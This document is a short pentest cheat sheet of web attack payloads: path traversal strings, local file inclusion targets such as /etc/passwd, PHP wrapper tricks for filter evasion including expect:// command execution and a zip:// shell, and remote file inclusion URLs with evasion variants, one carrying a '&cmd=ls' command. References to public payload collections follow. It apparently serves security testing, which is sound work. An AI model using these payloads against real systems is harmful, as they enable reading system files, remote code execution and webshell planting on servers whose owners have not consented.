# Path Traversal List

## Directory Traversal Payloads

```
../../../../../../
..//..//..//..//..//
....//....//....//....//....//
```

## Local File Inclusion (LFI)

### Linux LFI Payloads

```
/etc/passwd
```

### Windows LFI Payloads

```
/windows/win.ini
```

### LFI Evasion Filters

```
php://filter/convert.base64-encode/resource=/path/to/file
php://input
data://text//plain;base64,<base64_encoded_payload>
expect://<os_command>
zip://file.jpg%23shell.php
```

## Remote File Inclusion (RFI)

### URL Payloads

```
https://cirt.net/rfiinc.txt
https://rfi.nessus.org/rfi.txt
```

### RFI Evasion

```
HTTps://cirt.net/rfiinc.txt
https://cirt.net/rfiinc.txt?
https://cirt.net/rfiinc.txt??
https://cirt.net/rfiinc.txt?%00&cmd=ls
```

---
## References

- [PayloadsAllTheThings: Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)

- [SecLists: Directory Traversal Payloads](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

- [0xffsec Handbook File Inclusion and Path Traversal](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/)

- [Cobalt: A Pentester's Guide to File Inclusion](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)

- [Malicious.link: Simple PHP webshell with php filter chains](https://room362.com/posts/2023/simple-php-webshell-with-php-filter-chains/)

- [Certcube: Cheatsheet – LFI & RCE & Webshells](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-webshells/)